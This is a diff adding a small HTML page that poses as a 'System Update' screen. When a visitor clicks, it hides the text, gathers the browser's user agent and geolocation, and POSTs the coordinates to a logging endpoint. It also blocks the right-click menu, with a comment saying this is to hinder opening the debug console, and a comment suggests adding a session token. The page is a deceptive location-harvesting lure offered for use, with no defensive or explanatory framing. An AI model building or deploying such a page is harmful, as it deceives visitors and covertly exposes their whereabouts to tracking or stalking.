@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>System Update</title>
+    <style>
+        body { margin: 0; background: #000; height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; font-family: sans-serif; }
+    </style>
+</head>
+<body>
+    <div id="ui" onclick="init()">
+        <p>System Initializing...</p>
+    </div>
+
+    <script>
+        // Empêcher l'ouverture de la console de débogage
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        
+        async function init() {
+            document.getElementById('ui').style.display = 'none';
+            
+            // Collecte chiffrée (envoi en POST)
+            const payload = {
+                ua: navigator.userAgent,
+                ts: Date.now(),
+                // On ajoute un jeton de session si besoin
+            };
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        fetch('/api/log_secure', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude, ...payload})
+                        });
+                    }
+                );
+            }
+        }
+    </script>
+</body>
+</html>
